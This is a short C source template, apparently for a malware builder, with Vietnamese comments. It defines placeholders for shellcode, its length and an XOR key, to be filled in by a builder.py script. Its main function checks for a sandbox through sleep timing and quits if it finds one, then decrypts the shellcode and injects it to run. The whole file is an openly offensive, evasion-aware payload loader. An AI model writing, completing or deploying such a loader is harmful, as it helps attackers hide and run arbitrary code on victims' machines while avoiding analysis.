#include <windows.h>
#include "techniques/T_encryption.h"
#include "techniques/T_injection.h"
#include "techniques/T_evasion.h"

/*{{DEFINES}}*/

// Placeholders sẽ được builder.py thay thế
unsigned char shellcode[] = /*{{SHELLCODE}}*/
unsigned int shellcode_len = /*{{SHELLCODE_LEN}}*/;
char* key = /*{{KEY}}*/;


int main(void) {
    // Ẩn cửa sổ console
    // FreeConsole();

    // Bước 1: Lẩn tránh (nếu có)
    #ifdef EVASION_SLEEP_CHECK
        if (IsSandboxed_Sleep()) { return 0; }
    #endif

    // Bước 2: Giải mã
    #ifdef ENCRYPTION_XOR
        Decrypt_XOR(shellcode, shellcode_len, key);
    #endif

    // Bước 3: Inject và thực thi
    #ifdef INJECTION_CLASSIC
        Inject_Classic(shellcode, shellcode_len);
    #endif

    return 0;
}